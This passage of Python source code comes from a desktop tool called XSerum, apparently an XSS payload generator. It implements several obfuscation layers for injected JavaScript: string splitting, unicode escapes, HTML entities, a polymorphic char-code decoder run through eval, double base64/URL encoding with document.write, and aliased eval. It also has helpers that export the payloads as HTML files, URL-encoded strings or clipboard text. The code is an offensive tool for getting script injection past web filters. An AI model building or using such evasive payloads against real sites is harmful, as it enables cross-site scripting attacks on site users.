        # Create the obfuscated version
        obfuscated_js = "+".join([f'"{chunk}"' for chunk in chunks])
        return f"""
<script>
// Obfuscated via string splitting
eval({obfuscated_js});
</script>
"""
    
    def apply_unicode_obfuscation(self, payload):
        """Apply unicode escape sequence obfuscation"""
        if not payload.startswith("<script>") or not payload.endswith("</script>"):
            # Wrap non-script payloads
            payload = f"<script>{payload}</script>"
            
        # Extract the JavaScript part
        js_code = payload.replace("<script>", "").replace("</script>", "")
        
        # Convert to unicode escape sequences
        unicode_code = ""
        for char in js_code:
            unicode_code += f"\\u{ord(char):04x}"
            
        return f"""
<script>
// Unicode obfuscated
eval("{unicode_code}");
</script>
"""

    def apply_html_entity_obfuscation(self, payload):
        """Apply HTML entity encoding obfuscation"""
        # Convert characters to HTML entities
        result = ""
        for char in payload:
            if random.random() > 0.3 and ord(char) < 128:  # Only encode some characters
                result += f"&#{ord(char)};"
            else:
                result += char
                
        return result
        
    def apply_polymorphic_obfuscation(self, payload):
        """Apply polymorphic code generation"""
        if not payload.startswith("<script>") or not payload.endswith("</script>"):
            # Wrap non-script payloads
            payload = f"<script>{payload}</script>"
            
        # Extract the JavaScript part
        js_code = payload.replace("<script>", "").replace("</script>", "")
        
        # Create a polymorphic wrapper with random variable names
        var_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(5))
        decoder_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(7))
        
        # Apply simple polymorphic transformation
        transformed = ""
        for char in js_code:
            transformed += f"{ord(char)},"
        transformed = transformed.rstrip(",")
        
        return f"""
<script>
// Polymorphic code generation
function {decoder_name}(c) {{
    var {var_name} = '';
    c.split(',').forEach(function(i) {{
        {var_name} += String.fromCharCode(i);
    }});
    return {var_name};
}}
eval({decoder_name}("{transformed}"));
</script>
"""
        
    def apply_double_encoding_obfuscation(self, payload):
        """Apply double encoding obfuscation"""
        # First encode as base64
        base64_encoded = base64.b64encode(payload.encode()).decode()
        
        # Then apply URL encoding to certain characters
        result = ""
        for char in base64_encoded:
            if char in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=":
                if random.random() > 0.7:  # Only encode some characters
                    result += urllib.parse.quote(char)
                else:
                    result += char
            else:
                result += char
                
        return f"""
<script>
// Double-encoded payload
var encoded = "{result}";
var decoded = atob(decodeURIComponent(encoded.replace(/%([0-9A-F]{{2}})/g, function(_, p1) {{
    return String.fromCharCode('0x' + p1);
}})));
document.write(decoded);
</script>
"""
        
    def apply_multilayer_obfuscation(self, payload):
        """Apply multi-layer obfuscation techniques"""
        # First apply base64
        payload = self.apply_base64_obfuscation(payload)
        
        # Then apply JavaScript string concatenation
        payload = self.apply_js_string_obfuscation(payload)
        
        # Finally apply some randomized name obfuscation
        exec_func = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
        return payload.replace("eval(", f"window['{exec_func}']=eval;window['{exec_func}'](")
    
    def apply_output_format(self, payload, output_format, attack_type):
        """Apply the selected output format"""
        if output_format == "Raw Code":
            return payload
        elif output_format == "HTML File":
            return f"""
<!DOCTYPE html>
<html>
<head>
    <title>XSerum Payload</title>
    <meta charset="UTF-8">
</head>
<body>
    <!-- Generated by XSerum - {attack_type} payload -->
    {payload}
</body>
</html>
"""
        elif output_format == "URL-encoded":
            return urllib.parse.quote(payload)
        else:
            return payload
    
    def copy_to_clipboard(self):
        """Copy output to clipboard"""
        payload = self.output_text.get("1.0", tk.END).strip()
        if payload:
            self.root.clipboard_clear()
            self.root.clipboard_append(payload)
            messagebox.showinfo("Copied", "Payload copied to clipboard")
        else:
            messagebox.showinfo("Empty", "No payload to copy")
    
    def save_to_file(self):
        """Save output to a file"""
        payload = self.output_text.get("1.0", tk.END).strip()
        if not payload:
            messagebox.showinfo("Empty", "No payload to save")
            return
            
        # Create a temporary file
        attack_type = self.selected_attack.get().lower().replace(" ", "_")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"xserum_{attack_type}_{timestamp}"
        
        output_format = self.selected_output.get()
        if output_format == "HTML File":
            filename += ".html"
        else:
            filename += ".txt"
            
        try:
            # Get the user's home directory
            home_dir = os.path.expanduser("~")
            downloads_dir = os.path.join(home_dir, "Downloads")
            if not os.path.exists(downloads_dir):
                downloads_dir = home_dir
                
            filepath = os.path.join(downloads_dir, filename)
            
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(payload)
                
            messagebox.showinfo("Saved", f"Payload saved to:\n{filepath}")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save file: {str(e)}")
    
    def clear_output(self):
        """Clear the output display"""
        self.output_text.config(state=tk.NORMAL)
        self.output_text.delete("1.0", tk.END)
        self.output_text.config(state=tk.DISABLED)


def main():
    """Main application entry point"""
    root = tk.Tk()
    app = XSerum(root)
    
    # Set app icon (using a simple character as a placeholder)
    root.iconbitmap()  # Clear any default icon
    
    # Use a custom font for better readability if available
    try:
        default_font = tk.font.nametofont("TkDefaultFont")
        default_font.configure(size=10)
    except:
        pass
    
    # Center the window on screen
    root.update_idletasks()
    width = root.winfo_width()
    height = root.winfo_height()
    x = (root.winfo_screenwidth() // 2) - (width // 2)
    y = (root.winfo_screenheight() // 2) - (height // 2)
    root.geometry(f'+{x}+{y}')
    
    root.mainloop()


if __name__ == "__main__":
    main()
